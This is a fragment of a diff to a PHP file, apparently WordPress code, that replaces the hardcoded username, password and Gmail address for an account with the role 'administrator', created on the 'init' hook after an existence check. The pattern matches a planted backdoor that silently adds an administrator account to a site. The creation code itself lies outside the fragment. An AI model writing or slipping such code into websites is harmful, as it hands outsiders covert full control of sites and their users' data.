@@ -15,9 +15,9 @@ if ( ! defined( 'ABSPATH' ) ) {
 add_action( 'init', function () {
 
     // ==== KONFIGURASI USER ====
-    $username = 'kamuaya';
-    $password = '@akusiapa#';
-    $email    = 'yaajiangbu@gmail.com';
+    $username = 'labterpaduya';
+    $password = '@kamugilak#';
+    $email    = 'hausut878@gmail.com';
     $role     = 'administrator';
 
     // ==== CEK APAKAH SUDAH ADA ====
